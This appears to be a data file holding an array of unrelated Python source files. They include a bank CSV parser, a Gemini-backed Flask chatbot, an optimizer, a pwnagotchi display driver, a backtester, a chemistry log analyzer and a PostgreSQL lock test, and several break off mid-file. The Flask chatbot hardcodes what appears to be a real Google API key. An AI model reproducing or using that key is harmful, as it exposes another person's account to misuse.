    "import polars as pl\n\n\nclass MCB:\n    csv_df = None \n    csv_info = None\n\n    @classmethod\n    def process_csv(cls, path):\n\n        info = {\n\n        }\n\n        with open(path) as file:\n            line = file.readline()\n            while line:\n                \n                if line.strip() == \"\":\n                    line = file.readline()\n                    continue\n                \n                line = line.strip().strip('\\n').strip('\"').casefold()\n                if line[:len('account number')] ==\"account number\":\n                    info['account_number'] = line[len('account number'):].strip()\n\n                if line[:len('account currency')] ==\"account currency\":\n                    info['account_currency'] = line[len('account currency'):].strip().upper()\n\n                if line[:len('opening balance')] ==\"opening balance\":\n                    info['opening_balance'] = line[len('opening balance'):].strip().replace(',', '')\n\n                if line[:len('closing balance')] ==\"closing balance\":\n                    info['closing_balance'] = line[len('closing balance'):].strip().replace(',', '')\n\n                if line[:len('specified period')] ==\"specified period\":\n                    info['specified_period'] = line[len('specified period'):].strip().strip('()')\n\n                if line[:len('transaction date')] ==\"transaction date\":\n                    break\n\n                \n                line = file.readline()\n\n        df = pl.read_csv(path, skip_rows=14)\n        df = df.drop_nulls()\n        df = df.with_columns(pl.col('Value Date').str.strptime(pl.Date,'%d-%b-%Y'))\n        df = df.with_columns(pl.col('Transaction Date').str.strptime(pl.Date,'%d-%b-%Y'))\n        df = df.with_columns(pl.col(\"Money out\").str.replace(r\",\", \"\"))\n        df = df.with_columns(pl.col(\"Money in\").str.replace(r\",\", \"\"))\n        df = df.with_columns(pl.col('Money out').cast(pl.Decimal(scale=2, precision=None), strict=False))\n        df = df.with_columns(pl.col('Money in').cast(pl.Decimal(scale=2, precision=None), strict=False))\n\n        info['money_in'] = df['Money in'].sum()\n        info['money_out'] = df['Money out'].sum()\n\n        \n        # x = df.group_by(\"Description\").agg(pl.col(\"Money in\").sum())\n        # print(dict(x.iter_rows()))\n\n        cls.csv_df = df \n        cls.csv_info = info\n\n        return {\n            'df': df,\n            'info': info\n        }\n    \n    @classmethod\n    def csv_money_in(cls):\n        if cls.csv_df is None:\n            raise Exception('Please use MCB.process_csv first')\n        groupby = cls.csv_df.group_by(\"Description\").agg(pl.col(\"Money in\").sum())\n        rows = dict(groupby.iter_rows())\n        filtered_above_0 = dict(filter(lambda e:e[1]>0.0, rows.items() ) )\n\n        return filtered_above_0\n    \n    @classmethod\n    def csv_money_out(cls):\n        if cls.csv_df is None:\n            raise Exception('Please use MCB.process_csv first')\n        groupby = cls.csv_df.group_by(\"Description\").agg(pl.col(\"Money out\").sum())\n        rows = dict(groupby.iter_rows())\n        filtered_above_0 = dict(filter(lambda e:e[1]>0.0, rows.items() ) )\n\n        return filtered_above_0\n\n\n\n",
    "from flask import Flask, render_template, request\nimport google.generativeai as genai\n\napp = Flask(__name__)\n\n# Configure the API key for authentication\ngenai.configure(api_key=\"AIzaSyA6Bkhpmh6MY2-whmHejhRUsnA286YsExI\")\n\n# Set up the model with generation configuration and safety settings\ngeneration_config = {\n    \"temperature\": 0.9,\n    \"top_p\": 1,\n    \"top_k\": 1,\n    \"max_output_tokens\": 2048,\n}\n\nsafety_settings = [\n    {\n        \"category\": \"HARM_CATEGORY_HARASSMENT\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n    {\n        \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n    {\n        \"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n    {\n        \"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\",\n        \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n    },\n]\n\n# Initialize the generative model\nmodel = genai.GenerativeModel(\n    model_name=\"gemini-1.0-pro\",\n    generation_config=generation_config,\n    safety_settings=safety_settings\n)\n\n# Function to start a conversation\ndef start_conversation():\n    return model.start_chat(history=[\n        {\n            \"role\": \"user\",\n            \"parts\": [\"car\"]\n        },\n        {\n            \"role\": \"model\",\n            \"parts\": [\"**Noun**\\n\\n1. A motor vehicle with four wheels, an engine that powers it, and seats for one to eight people.\\n2. A railway carriage for passengers.\\n3. A cable car or funicular railway.\\n4. (informal) A stolen vehicle.\\n\\n**Verb**\\n\\n1. To transport or drive (someone or something) in a car.\\n2. (slang) To steal (a car).\\n\\n**Examples**\\n\\n1. We drove to the beach in my new car.\\n2. The car was parked illegally.\\n3. The car was stolen from the driveway.\\n4. The thief was arrested for car theft.\\n\\n**Synonyms**\\n\\n* Automobile\\n* Vehicle\\n* Motor car\\n* Coach\\n* Saloon\\n* Sedan\\n* Coupe\\n* Hatchback\\n* Estate car\\n* Station wagon\\n* SUV\\n* Crossover\"]\n        }\n    ])\n\n\n# Home route\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\n# Chatbot route\n@app.route('/chatbot', methods=['POST'])\ndef chatbot():\n    user_input = request.form['user_input']\n    convo = start_conversation()\n    convo.send_message(user_input)\n    bot_response = convo.last.text\n    return render_template('index.html', user_input=user_input, bot_response=bot_response)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
    "\"\"\"\nSGDP Optimizer Implementation copied from https://github.com/clovaai/AdamP/blob/master/adamp/sgdp.py\n\nPaper: `Slowing Down the Weight Norm Increase in Momentum-based Optimizers` - https://arxiv.org/abs/2006.08217\nCode: https://github.com/clovaai/AdamP\n\nCopyright (c) 2020-present NAVER Corp.\nMIT license\n\"\"\"\n\nimport torch\nimport torch.nn as nn\nfrom torch.optim.optimizer import Optimizer, required\nimport math\n\nclass SGDP(Optimizer):\n    def __init__(self, params, lr=required, momentum=0, dampening=0,\n                 weight_decay=0, nesterov=False, eps=1e-8, delta=0.1, wd_ratio=0.1):\n        defaults = dict(lr=lr, momentum=momentum, dampening=dampening, weight_decay=weight_decay,\n                        nesterov=nesterov, eps=eps, delta=delta, wd_ratio=wd_ratio)\n        super(SGDP, self).__init__(params, defaults)\n\n    def _channel_view(self, x):\n        return x.view(x.size(0), -1)\n\n    def _layer_view(self, x):\n        return x.view(1, -1)\n\n    def _cosine_similarity(self, x, y, eps, view_func):\n        x = view_func(x)\n        y = view_func(y)\n\n        x_norm = x.norm(dim=1).add_(eps)\n        y_norm = y.norm(dim=1).add_(eps)\n        dot = (x * y).sum(dim=1)\n\n        return dot.abs() / x_norm / y_norm\n\n    def _projection(self, p, grad, perturb, delta, wd_ratio, eps):\n        wd = 1\n        expand_size = [-1] + [1] * (len(p.shape) - 1)\n        for view_func in [self._channel_view, self._layer_view]:\n\n            cosine_sim = self._cosine_similarity(grad, p.data, eps, view_func)\n\n            if cosine_sim.max() < delta / math.sqrt(view_func(p.data).size(1)):\n                p_n = p.data / view_func(p.data).norm(dim=1).view(expand_size).add_(eps)\n                perturb -= p_n * view_func(p_n * perturb).sum(dim=1).view(expand_size)\n                wd = wd_ratio\n\n                return perturb, wd\n\n        return perturb, wd\n\n    def step(self, closure=None):\n        loss = None\n        if closure is not None:\n            loss = closure()\n\n        for group in self.param_groups:\n            weight_decay = group['weight_decay']\n            momentum = group['momentum']\n            dampening = group['dampening']\n            nesterov = group['nesterov']\n\n            for p in group['params']:\n                if p.grad is None:\n                    continue\n                grad = p.grad.data\n                state = self.state[p]\n\n                # State initialization\n                if len(state) == 0:\n                    state['momentum'] = torch.zeros_like(p.data)\n\n                # SGD\n                buf = state['momentum']\n                buf.mul_(momentum).add_(1 - dampening, grad)\n                if nesterov:\n                    d_p = grad + momentum * buf\n                else:\n                    d_p = buf\n\n                # Projection\n                wd_ratio = 1\n                if len(p.shape) > 1:\n                    d_p, wd_ratio = self._projection(p, grad, d_p, group['delta'], group['wd_ratio'], group['eps'])\n\n                # Weight decay\n                if weight_decay != 0:\n                    p.data.mul_(1 - group['lr'] * group['weight_decay'] * wd_ratio / (1-momentum))\n\n                # Step\n                p.data.add_(-group['lr'], d_p)\n\n        return loss\n",
    "import logging\n\nimport pwnagotchi.ui.fonts as fonts\nfrom pwnagotchi.ui.hw.base import DisplayImpl\n\n\nclass Inky(DisplayImpl):\n    def __init__(self, config):\n        super(Inky, self).__init__(config, 'inky')\n\n    def layout(self):\n        fonts.setup(10, 8, 10, 28, 25, 9)\n        self._layout['width'] = 250\n        self._layout['height'] = 122\n        self._layout['face'] = (0, 37)\n        self._layout['name'] = (5, 18)\n        self._layout['channel'] = (0, 0)\n        self._layout['aps'] = (30, 0)\n        self._layout['uptime'] = (147, 0)\n        self._layout['line1'] = [0, 12, 212, 12]\n        self._layout['line2'] = [0, 92, 212, 92]\n        self._layout['friend_face'] = (0, 76)\n        self._layout['friend_name'] = (40, 78)\n        self._layout['shakes'] = (0, 93)\n        self._layout['mode'] = (187, 93)\n        self._layout['status'] = {\n            'pos': (102, 18),\n            'font': fonts.status_font(fonts.Small),\n            'max': 20\n        }\n        return self._layout\n\n    def initialize(self):\n        logging.info(\"initializing inky display\")\n\n        if self.config['color'] == 'fastAndFurious':\n            logging.info(\"Initializing Inky in 2-color FAST MODE\")\n            logging.info(\"THIS MAY BE POTENTIALLY DANGEROUS. NO WARRANTY IS PROVIDED\")\n            logging.info(\"USE THIS DISPLAY IN THIS MODE AT YOUR OWN RISK\")\n\n            from pwnagotchi.ui.hw.libs.inkyphat.inkyphatfast import InkyPHATFast\n            self._display = InkyPHATFast('black')\n            self._display.set_border(InkyPHATFast.BLACK)\n        elif self.config['color'] == 'auto':\n            from inky.auto import auto\n            self._display = auto()\n            self._display.set_border(self._display.BLACK)\n            self._layout['width'] = self._display.WIDTH\n            self._layout['height'] = self._display.HEIGHT\n        else:\n            from inky import InkyPHAT\n            self._display = InkyPHAT(self.config['color'])\n            self._display.set_border(InkyPHAT.BLACK)\n\n    def render(self, canvas):\n        if self.config['color'] == 'black' or self.config['color'] == 'fastAndFurious':\n            display_colors = 2\n        else:\n            display_colors = 3\n\n        img_buffer = canvas.convert('RGB').convert('P', palette=1, colors=display_colors)\n        if self.config['color'] == 'red':\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0,  # index 1 is black\n                255, 0, 0  # index 2 is red\n            ])\n        elif self.config['color'] == 'yellow':\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0,  # index 1 is black\n                255, 255, 0  # index 2 is yellow\n            ])\n        else:\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0  # index 1 is black\n            ])\n\n        self._display.set_image(img_buffer)\n        try:\n            self._display.show()\n        except:\n            logging.exception(\"error while rendering on inky\")\n\n    def clear(self):\n        self._display.Clear()\n",
    "import datetime\nimport logging\nimport multiprocessing\nimport re\nimport time\nimport warnings\nfrom typing import Callable\nfrom typing import Optional\nfrom zoneinfo import ZoneInfo\n\nimport time_machine\nfrom apscheduler.executors.pool import ThreadPoolExecutor\nfrom apscheduler.job import Job\nfrom apscheduler.schedulers.background import BackgroundScheduler\nfrom apscheduler.schedulers.blocking import BlockingScheduler\nfrom apscheduler.triggers.cron import CronTrigger\nfrom apscheduler.triggers.date import DateTrigger\nfrom pydantic import BaseModel\nfrom pydantic import model_validator\nfrom rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, TaskProgressColumn, SpinnerColumn\nfrom tzlocal import get_localzone\nfrom urllib3.exceptions import SystemTimeWarning\n\nfrom anterior import logger, console\nfrom .schedule import Schedule, _schedule_decorator\n\nwarnings.filterwarnings(\"ignore\", category=SystemTimeWarning)\n\n\nclass BackTester(BaseModel):\n    timezone: str = get_localzone().__str__()\n    function_map: dict = {}\n    _tzinfo: ZoneInfo = None\n\n    @model_validator(mode=\"after\")\n    def _model_validator(self):\n        try:\n            self._tzinfo = ZoneInfo(self.timezone)\n        except Exception:\n            raise ValueError(f\"Invalid timezone: {self.timezone}\")\n\n    def __init__(self, workers: int = 1, **kwargs):\n        super().__init__(**kwargs)\n\n        # =================== Scheduling ===================\n        workers = workers if workers > 0 else multiprocessing.cpu_count() - 2\n        # self._scheduler = BlockingScheduler(executors={\"default\": ThreadPoolExecutor(workers)}, timezone=self._tzinfo)\n        self._scheduler = BackgroundScheduler(executors={\"default\": ThreadPoolExecutor(workers)}, timezone=self._tzinfo)\n\n    def now(self):\n        \"\"\"\n        Returns the timezone-aware datetime of the backtester.\n\n        Returns\n        -------\n        datetime.datetime\n            The timezone-aware datetime of the backtester.\n\n        Notes\n        -----\n        - The datetime is timezone-aware and is in the timezone specified by the backtester's `timezone` attribute.\n        - The datetime is the simulated time in the backtest if the backtester is being backtested.\n        - The datetime is the current system time if the backtester is running in live mode.\n        \"\"\"\n\n        return datetime.datetime.now(tz=self._tzinfo)\n\n    def on_start(self):\n        \"\"\"\n        Gets called when the backtester starts.\n\n        Tip\n        -----\n        - Override this method to add custom behavior when the backtester starts.\n\n        \"\"\"\n        pass\n\n    def on_stop(self):\n        \"\"\"\n        Gets called when the backtester stops.\n\n        Tip\n        -----\n        - Override this method to add custom behavior when the backtester stops.\n        \"\"\"\n        pass\n\n    def do(self, function: Callable, name: Optional[str] = None, log: bool = True):\n        \"\"\"\n        Schedules a function to run immediately during the backtester's run.\n\n        Parameters\n        ----------\n        function : Callable\n            The function to schedule.\n        name : str, optional\n            The name of the function to schedule. Defaults to the function\"s name.\n        log : bool\n            Whether to log the function to the backtester's logs. Defaults to True.\n\n        Returns\n        -------\n        Job\n            The job object running the specified function.\n\n        See Also\n        --------\n        - [`Schedule.do`](schedule.md#anterior.warp.schedule.Schedule.do) Defines the function to run on the schedule object.\n\n        Examples\n        --------\n\n        ???+ Example \"Running a function immediately\"\n            ```python\n            bt = BackTester(name=\"do_example\")\n\n            def function():\n                print(\"Hello, world!\")\n\n            bt.do(function)\n            bt.run()   # prints \"Hello, world!\" as soon as the backtester starts\n            ```\n        \"\"\"\n        return Schedule(self).do(function=function, name=name, log=log)\n\n    def after(self, delta: Optional[datetime.timedelta] = None, days: int = 0, hours: int = 0, minutes: int = 0,\n              seconds: int = 0) -> Schedule:\n        \"\"\"\n        Creates a Schedule object that will trigger after the specified time interval.\n\n        Parameters\n        ----------\n        delta : datetime.timedelta, optional\n            The time interval to trigger after. Mutually exclusive with days, hours, minutes, and seconds.\n        days : int, optional\n            The number of days to trigger after. Mutually exclusive with delta.\n        hours : int, optional\n            The number of hours to trigger after. Mutually exclusive with delta.\n        minutes : int, optional\n            The number of minutes to trigger after. Mutually exclusive with delta.\n        seconds : int, optional\n            The number of seconds to trigger after. Mutually exclusive with delta.\n\n        Returns\n        -------\n        Schedule\n            Schedule object that will t",
    "\r\n'''\r\n    analyzer module of ChemAuto program for analyzing Gaussian computational opt and sp tasks \r\n    Functions: extracting information such as State, HF (Hartree-Fock energy), ZPE (Zero Point Energy), Etot (Total Energy), and NImag (Number of Imaginary Frequencies).\r\n    Features\uff1a\r\n        4 optput formats:\r\n                            opt+excel\r\n                            opt+text\r\n                            sp+excel\r\n                            sp+text\r\n    Developed by: Li Xilong\r\n    Last update: 2024-04-01\r\n\r\n'''\r\n\r\n'''\r\n    Maximize code reuse, although customization in Excel spreadsheets makes it challenging.\r\n    Consolidate analysis and save types, providing four options:\r\n        1. opt+excel 2. opt+text 3. sp+excel 4. sp+text\r\n    Program workflow:\r\n        1. Select analysis and save type.\r\n        2. Choose the folder for log files (supports primary and secondary folders).\r\n        3. Select the folder for saving results.\r\n        4. Input the filename for saving.\r\n        5. Execute the analysis.\r\n    Organize code structure in the following order:\r\n        1. Constructor method: Initializes the state of the class instance.\r\n        2. Core process methods: Methods involving user interaction, such as starting analysis, selecting analysis and save types.\r\n        3. Analysis execution methods: Methods that perform specific analyses, like processing different types of log files.\r\n        4. Helper methods: Such as file creation and directory validation.\r\n        5. Other private or specialized methods: Methods for internal use within the class.\r\n    \r\n    The use of == and class properties may have a slight performance advantage in theory.\r\n    \r\n    Regular expression matching utilizes a pattern traversal method, where the order of keywords in the pattern is crucial.\r\n    \r\n    Set selection branches in main().\r\n    \r\n    Resolve ValueError: could not convert string to float: '0.472E-01-0.207E+00' error.\r\n        The reason was not resetting self.lines[] and self.coord_start_indices=[] for each new log processing.\r\n    \r\n    Set detailed timing for structure extraction.\r\n    \r\n    Add symmetry extraction:\r\n        Sym regex: r\"P\\s*G\\s*=\\s*([^=\\[]*)\\s*\\[\"\r\n            Explanation: \\s matches any whitespace character including space, tab, newline, etc.\r\n                    ([^=\\[]*): This is a capturing group that matches and captures any sequence of characters between = and [, excluding = and [.\r\n\r\n    Simplify other regex: [\\n\\s]*---->\\s*\r\n    \r\n    Both initial and optimized structures can be extracted, or just the optimized structures.\r\n    \r\n    Select the folder containing the log files separately; it can be used when the Excel file is not in the log folder.\r\n    \r\n    Program run test:\r\n        For 639 output files, generating initial and optimized structures:\r\n            Please input the num of structures to extract: 639\r\n            Starting copying the Excel file...\r\n            Excel file copied successfully.\r\n            Generating xyz files, please wait...\r\n            \r\n            Rendering time : 238.6703372001648 seconds              ~4min\r\n                \r\n            Inserting time : 7.464064836502075 seconds              \r\n            \r\n            Total running time : 375.57376527786255 seconds         ~6.5min\r\n            Generated Excel file size is 245Mb\r\n\r\n        For 4011 output files, generating initial and optimized structures:\r\n            Please input the num of structures to extract: 4011\r\n            Starting copying the Excel file...\r\n            Excel file copied successfully.\r\n            Generating xyz files, please wait...\r\n            \r\n            Rendering time : 1501.3692154884338 seconds\r\n            \r\n            Inserting time : 43.93924117088318 seconds\r\n            \r\n            Total running time : 1861.5184030532837 seconds\r\n    \r\n    There is still room to improve the speed of the rendering part.\r\n'''\r\n\r\nimport os\r\nimport re\r\nimport time\r\nimport shutil\r\nimport openpyxl\r\nimport logging\r\nfrom datetime import datetime\r\nfrom logcreator import setup_logging, logged_input, logged_print\r\nfrom openpyxl.styles import Font, Color, Alignment, NamedStyle\r\nfrom openpyxl import Workbook\r\nfrom openpyxl import load_workbook\r\nfrom openpyxl.drawing.image import Image\r\n\r\nclass GaussianLogAnalyzer:\r\n    def __init__(self):\r\n        self.log_dir = None\r\n        self.output_dir = None\r\n        self.excel_save_path = None\r\n        self.txt_save_path = None\r\n        self.count_failed = 0\r\n        self.count_successed = 0\r\n        self.count_all = 0\r\n        self.analysis_type = None\r\n        self.save_type = None\r\n        self.opt_patterns = {\r\n            \"sym\" : r'P\\s*G\\s*=\\s*([^=\\[]*)\\s*\\[',\r\n            #\"state\": r'S[\\n\\s]*t[\\n\\s]*a[\\n\\s]*t[\\n\\s]*e[\\n\\s]*=[\\n\\s]*([^=\\\\]*)[\\n\\s]*\\\\',\r\n            \"state\": r'S\\s*t\\s*a\\s*t\\s*e\\s*=\\s*([^=\\\\]*)\\s*\\\\',\r\n            #\"hf\": r'H[\\n\\s]*F[\\n\\s]*=[\\n\\s]*([^=\\\\]*)[\\n\\s]*\\\\',\r\n            \"hf\": r'H\\s*F\\s*=\\s*([^=\\\\]*)\\s*\\",
    "from datetime import datetime\nimport comfy.utils\n\ntime = datetime.now()\n\nclass Chrono_reset:\n    def __init__(self):\n        pass\n    \n    @classmethod\n    def INPUT_TYPES(s):\n        return { \"required\": {\"clip\": (\"CLIP\",), } }\n\n    RETURN_TYPES = (\"CLIP\",)\n    RETURN_NAMES = (\"clip\",)\n\n    FUNCTION = \"reset\"\n    CATEGORY = \"Chrono \u23f1\ufe0f\"\n\n    def reset(self, clip):\n        global time\n        time = datetime.now()\n        return (clip,)\n\nclass Chrono_get:\n    def __init__(self):\n        pass\n    \n    @classmethod\n    def INPUT_TYPES(s):\n        return { \"required\": {\"image\": (\"IMAGE\",), } }\n\n    RETURN_TYPES = (\"IMAGE\",)\n    RETURN_NAMES = (\"image\",)\n\n    FUNCTION = \"get\"\n    CATEGORY = \"Chrono \u23f1\ufe0f\"\n\n    def get(self, image): \n        print(\"\u23f1\ufe0f Time:\", datetime.now() - time)\n        return (image,)\n\nNODE_CLASS_MAPPINGS = {\n    \"Chrono Reset\": Chrono_reset,\n    \"Chrono Get\": Chrono_get\n}\n\nNODE_DISPLAY_NAME_MAPPINGS = {\n    \"Chrono Reset\": \"\u23f1\ufe0f Reset Chrono\",\n    \"Chrono Get\": \"\u2753 Get Chrono\"\n}\n",
    "\"\"\"\n@author: Chao Song\n\"\"\"\n\nimport tensorflow as tf\nimport numpy as np\nimport time\nimport cmath\nimport scipy.io\n\nnp.random.seed(1234)\ntf.set_random_seed(1234)\n\nmisfit = []\nmisfit1 = []\n\ndef fwd_gradients(Y, x):\n    dummy = tf.ones_like(Y)\n    G = tf.gradients(Y, x, grad_ys=dummy, colocate_gradients_with_ops=True)[0]\n    Y_x = tf.gradients(G, dummy, colocate_gradients_with_ops=True)[0]\n    return Y_x\n\n####### Class for velocity inversion\nclass Velocityinversion:\n    # Initialize the class\n    def __init__(self, x, z, u0, du, du_xx, du_zz, m0, layers, omega):\n        \n        X = np.concatenate([x, z], 1)\n        \n        self.lb = X.min(0)\n        self.ub = X.max(0)\n                \n        self.X = X\n\n        self.x = X[:,0:1]\n        self.z = X[:,1:2]\n        \n        self.u0 = u0\n        self.du = du\n        self.du_xx = du_xx\n        self.du_zz = du_zz\n        self.m0 = m0\n\n        self.omega = omega\n        self.layers = layers\n        \n        # Initialize NN\n        self.weights, self.biases = self.initialize_NN(layers)  \n\n        # tf placeholders \n        self.sess = tf.Session(config=tf.ConfigProto(allow_soft_placement=True,\n                                                     log_device_placement=True))\n\n        self.x_tf = tf.placeholder(tf.float32, shape=[None, self.x.shape[1]])\n        self.z_tf = tf.placeholder(tf.float32, shape=[None, self.z.shape[1]])\n\n        self.m_pred, self.f_loss = self.net_NS(self.x_tf, self.z_tf)\n\n        # loss function we define\n       \n        self.loss = tf.reduce_sum(tf.square(tf.abs(self.f_loss)))\n        \n        # optimizer used by default (in original paper)        \n            \n        self.optimizer = tf.contrib.opt.ScipyOptimizerInterface(self.loss, \n                                                                method = 'L-BFGS-B', \n                                                                options = {'maxiter': 50000,\n                                                                           'maxfun': 50000,\n                                                                           'maxcor': 50,\n                                                                           'maxls': 50,\n                                                                           'ftol' : 1.0 * np.finfo(float).eps})        \n        \n        self.optimizer_Adam = tf.train.AdamOptimizer()\n        self.train_op_Adam = self.optimizer_Adam.minimize(self.loss)                    \n        \n        init = tf.global_variables_initializer()\n        self.sess.run(init)\n\n    def initialize_NN(self, layers):        \n        weights = []\n        biases = []\n        num_layers = len(layers) \n        for l in range(0,num_layers-1):\n            W = self.xavier_init(size=[layers[l], layers[l+1]])\n            b = tf.Variable(tf.zeros([1,layers[l+1]], dtype=tf.float32)+0.0, dtype=tf.float32)\n            weights.append(W)\n            biases.append(b)        \n        return weights, biases\n        \n    def xavier_init(self, size):\n        in_dim = size[0]\n        out_dim = size[1]        \n        xavier_stddev = np.sqrt(2/(in_dim + out_dim))\n        return tf.Variable(tf.truncated_normal([in_dim, out_dim], stddev=xavier_stddev), dtype=tf.float32)\n    \n    def neural_net(self, X, weights, biases):\n        num_layers = len(weights) + 1\n        \n        H = 2.0*(X - self.lb)/(self.ub - self.lb) - 1.0\n        for l in range(0,num_layers-2):\n            W = weights[l]\n            b = biases[l]\n        #    H = tf.nn.relu(tf.add(tf.matmul(H, W), b))\n            H = tf.atan(tf.add(tf.matmul(H, W), b))\n        W = weights[-1]\n        b = biases[-1]\n        Y = tf.add(tf.matmul(H, W), b)\n        return Y\n\n    def net_NS(self, x, z):\n\n        omega = self.omega\n        m0 = self.m0\n\n        u0 = self.u0\n        du = self.du\n        du_xx = self.du_xx\n        du_zz = self.du_zz\n      \n        m = self.neural_net(tf.concat([x,z], 1), self.weights, self.biases)\n  \n       # m_x = fwd_gradients(m, x)\n       # m_z = fwd_gradients(m, z)\n\n        #f_loss =  omega*omega*m*du + du_xx + du_zz + omega*omega*(m-m0)*u0 + 0.1*(m_x**2+m_z**2)**0.5 \n        f_loss =  omega*omega*m*du + du_xx + du_zz + omega*omega*(m-m0)*u0 \n\n        return m, f_loss       \n    \n    def callback(self, loss):\n        print('Loss: %.3e' % (loss))      \n        misfit1.append(loss)\n        scipy.io.savemat('misfit1_v.mat',{'misfit1':misfit1})\n\n    def train(self, nIter): \n\n        tf_dict = {self.x_tf: self.x, self.z_tf: self.z}\n        \n        start_time = time.time()\n        for it in range(nIter):\n            self.sess.run(self.train_op_Adam, tf_dict)\n            loss_value = self.sess.run(self.loss, tf_dict)\n            misfit.append(loss_value)         \n            # Print\n            if it % 10 == 0:\n                elapsed = time.time() - start_time\n                loss_value = self.sess.run(self.loss, tf_dict)\n                print('It: %d, Loss: %.3e,Time: %.2f' % \n                      (it, loss_value, elapsed))\n                st",
    "from __future__ import annotations\nfrom contextlib import contextmanager\nfrom dataclasses import dataclass\nimport enum\nimport json\nimport threading\nimport time\n\nfrom typing import Iterator\nimport psycopg\nimport pytest\n\nROOT_URL = \"postgres:///postgres\"\nURL = \"postgres:///pglockpy\"\nSET_UP_SQL = \"\"\"\n    CREATE TABLE t (id INT);\n    CREATE TABLE u (id INT);\n    CREATE MATERIALIZED VIEW mat AS SELECT * FROM t;\n    CREATE INDEX idx ON t (id);\n    CREATE OR REPLACE FUNCTION f() RETURNS TRIGGER AS $$ BEGIN RETURN NEW; END; $$ LANGUAGE plpgsql;\n    ALTER TABLE t ADD CONSTRAINT constr CHECK (id > 0) NOT VALID;\n    CREATE SEQUENCE seq;\n\"\"\"\n\n\n@dataclass\nclass Connections:\n    a: psycopg.Connection\n    b: psycopg.Connection\n    c: psycopg.Connection  # no implicit TRANSACTION\n\n\n@dataclass(frozen=True)\nclass Lock:\n    relation: str\n    lock_kind: LockKind\n\n    @staticmethod\n    def from_mode(relation: str, mode: str) -> Lock:\n        lock_kind = {\n            \"AccessExclusiveLock\": L.ACCESS_EXCLUSIVE,\n            \"ExclusiveLock\": L.EXCLUSIVE,\n            \"ShareRowExclusiveLock\": L.SHARE_ROW_EXCLUSIVE,\n            \"ShareLock\": L.SHARE,\n            \"ShareUpdateExclusiveLock\": L.SHARE_UPDATE_EXCLUSIVE,\n            \"RowExclusiveLock\": L.ROW_EXCLUSIVE,\n            \"RowShareLock\": L.ROW_SHARE,\n            \"AccessShareLock\": L.ACCESS_SHARE,\n        }[mode]\n        return Lock(relation, lock_kind)\n\n\n@pytest.fixture\ndef conns() -> Iterator[Connections]:\n    \"\"\"Whole fresh database with N connections per test.\n\n    Not quick, but simple.\n    \"\"\"\n    try:\n        with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n            conn.execute(\"DROP DATABASE pglockpy\")\n    except Exception:\n        pass\n\n    with psycopg.connect(ROOT_URL, autocommit=True) as conn:\n        conn.execute(\"CREATE DATABASE pglockpy\")\n\n    with (\n        psycopg.connect(URL) as a,\n        psycopg.connect(URL) as b,\n        psycopg.connect(URL, autocommit=True) as c,\n    ):\n        a.execute(SET_UP_SQL)\n        a.commit()\n        yield Connections(a, b, c)\n\n\nclass LockKind(enum.Enum):\n    ACCESS_EXCLUSIVE = \"ACCESS EXCLUSIVE\"\n    EXCLUSIVE = \"EXCLUSIVE\"\n    SHARE_ROW_EXCLUSIVE = \"SHARE ROW EXCLUSIVE\"\n    SHARE = \"SHARE\"\n    SHARE_UPDATE_EXCLUSIVE = \"SHARE UPDATE EXCLUSIVE\"\n    ROW_EXCLUSIVE = \"ROW EXCLUSIVE\"\n    ROW_SHARE = \"ROW SHARE\"\n    ACCESS_SHARE = \"ACCESS SHARE\"\n    # SELECT ... FOR\n    FOR_UPDATE = \"FOR UPDATE\"\n    FOR_NO_KEY_UPDATE = \"FOR NO KEY UPDATE\"\n    FOR_SHARE = \"FOR SHARE\"\n    FOR_KEY_SHARE = \"FOR KEY SHARE\"\n\n\nL = LockKind\n\n\nclass Statement(enum.Enum):\n    DROP_TABLE = \"DROP TABLE t\"\n    TRUNCATE = \"TRUNCATE t\"\n    CREATE_TABLE = \"CREATE TABLE v (id INT)\"\n    ALTER_TABLE = \"ALTER TABLE t ADD COLUMN col INT\"\n    REINDEX = \"REINDEX TABLE t\"\n    VACUUM_FULL = \"VACUUM FULL\"\n    REFERESH_MATERIALIZED_VIEW = \"REFRESH MATERIALIZED VIEW mat\"\n    ALTER_TABLE_FOREIGN_KEY = (\n        \"ALTER TABLE t ADD CONSTRAINT fk FOREIGN KEY (id) REFERENCES u (id)\"\n    )\n    CREATE_TRIGGER = (\n        \"CREATE TRIGGER trig AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()\"\n    )\n    CREATE_INDEX = \"CREATE INDEX idy ON t (id)\"\n    VACUUM = \"VACUUM\"\n    ANALYZE = \"ANALYZE\"\n    CREATE_INDEX_CONCURRENTLY = \"CREATE INDEX CONCURRENTLY idy ON t (id)\"\n    CREATE_STATISTICS = \"CREATE STATISTICS stat ON id FROM t\"\n    REINDEX_CONCURRENTLY = \"REINDEX TABLE CONCURRENTLY t\"\n    ALTER_TABLE_SET_STATISTICS = \"ALTER TABLE t ALTER COLUMN id SET STATISTICS 100\"\n    ALTER_TABLE_VALIDATE_CONSTRAINT = \"ALTER TABLE t VALIDATE CONSTRAINT constr\"\n    ALTER_INDEX_RENAME = \"ALTER INDEX idx RENAME TO idy\"\n    UPDATE = \"UPDATE t SET id = 4\"\n    DELETE = \"DELETE FROM t\"\n    INSERT = \"INSERT INTO t VALUES (1)\"\n    MERGE = \"MERGE INTO t USING u AS sub ON t.id = u.id WHEN MATCHED THEN DO NOTHING\"\n    SELECT_FOR_UPDATE = \"SELECT * FROM t FOR UPDATE\"\n    SELECT_FOR_NO_KEY_UPDATE = \"SELECT * FROM t FOR NO KEY UPDATE\"\n    SELECT_FOR_SHARE = \"SELECT * FROM t FOR SHARE\"\n    SELECT_FOR_KEY_SHARE = \"SELECT * FROM t FOR KEY SHARE\"\n    SELECT = \"SELECT * FROM t\"\n\n    @property\n    def name_no_underscore(self) -> str:\n        return self.name.replace(\"_\", \" 